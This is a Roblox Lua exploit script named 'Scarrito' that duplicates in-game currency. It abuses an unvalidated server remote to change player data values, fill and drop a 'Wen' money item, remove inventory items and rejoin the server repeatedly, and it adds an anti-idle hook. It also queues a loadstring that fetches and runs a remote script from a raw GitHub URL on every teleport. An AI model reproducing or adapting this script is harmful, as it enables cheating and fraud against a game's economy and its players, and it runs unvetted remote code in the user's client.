if not game:IsLoaded() then
    game.Loaded:Wait()
end

print("[Scarrito] Loaded")

if getgenv().DUPE == true then 
    warn("[Scarrito] Active")
    return 
end
getgenv().DUPE = true

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")

local client = Players.LocalPlayer
local camera = workspace.CurrentCamera

print("[Scarrito] Checking")

local playerDataFolder = ReplicatedStorage:WaitForChild("Player_Data", 5)
local playerData = playerDataFolder and playerDataFolder:WaitForChild(client.Name, 5)

if not playerData then
    warn("[Scarrito] Failed Data")
    return
end

local remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
local toServer = remotes and remotes:WaitForChild("To_Server", 5)
local Handle_Initiate_S = toServer and toServer:WaitForChild("Handle_Initiate_S", 5)

if not Handle_Initiate_S then
    warn("[Scarrito] Failed Remote")
    return
end

client.Idled:Connect(function()
    VirtualUser:Button2Down(Vector2.new(0,0), camera.CFrame)
    task.wait(1)
    VirtualUser:Button2Up(Vector2.new(0,0), camera.CFrame)
end)

pcall(function()
    queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/dobretekonto123-sudo/batman12-0/refs/heads/main/dupe.lua"))()')
end)

local shrinkProp = playerData:WaitForChild("Custom_Properties"):WaitForChild("Nezuko_pacifier_stuff"):WaitForChild("Shrinkage")
Handle_Initiate_S:FireServer("Change_Value", shrinkProp, 0)

local function Rejoin()
    print("[Scarrito] Teleporting")
    if #Players:GetPlayers() <= 1 then
        TeleportService:Teleport(game.PlaceId, client)
    else
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, client)
    end
end

local function startDupeProcess()
    local wen = client.Backpack:WaitForChild("Wen", 3)
    
    if not wen then
        print("[Scarrito] Phase 1")
        Handle_Initiate_S:FireServer("Change_Value", shrinkProp, 69)

        while shrinkProp.Value ~= 69 do task.wait() end

        local inventoryItems = playerData:WaitForChild("Inventory"):WaitForChild("Items")
        
        while not inventoryItems:FindFirstChild("Wen") do
            local bag = workspace:FindFirstChild("Money bag")
            if bag then
                if bag.Position.Y < 0 then bag:Destroy() break end
                if client.Character and client.Character:FindFirstChild("HumanoidRootPart") then
                    client.Character.HumanoidRootPart.CFrame = bag.CFrame
                end
                Handle_Initiate_S:FireServer("transfer_money_to_money_bag2", client, playerData, bag)
            end
            task.wait()
        end

        local wenItem = inventoryItems:WaitForChild("Wen")
        Handle_Initiate_S:FireServer("change_equip_for_item", client, playerData.Inventory, wenItem)
        client.Backpack:WaitForChild("Wen")

        while wenItem:WaitForChild("Amount").Value < 150000 do task.wait() end

        Handle_Initiate_S:FireServer("Change_Value", shrinkProp, 67)
        while shrinkProp.Value ~= 67 do task.wait() end

        Rejoin()
        return
    end

    print("[Scarrito] Phase 2")
    if client.Character then
        wen.Parent = client.Character
        wen.Parent = workspace
    end
    
    local tim = tick()
    local inventoryItems = playerData:WaitForChild("Inventory"):WaitForChild("Items")
    
    while inventoryItems:FindFirstChild("Wen") and (tick() - tim) < 5 do 
        task.wait() 
    end
    
    Handle_Initiate_S:FireServer("remove_item", playerData)
    print("[Scarrito] Dropped")

    local dataWait = tick()
    while playerData and playerData.Parent and (tick() - dataWait) < 3 do 
        task.wait() 
    end

    print("[Scarrito] Rejoining")
    Rejoin()
end

task.spawn(startDupeProcess)
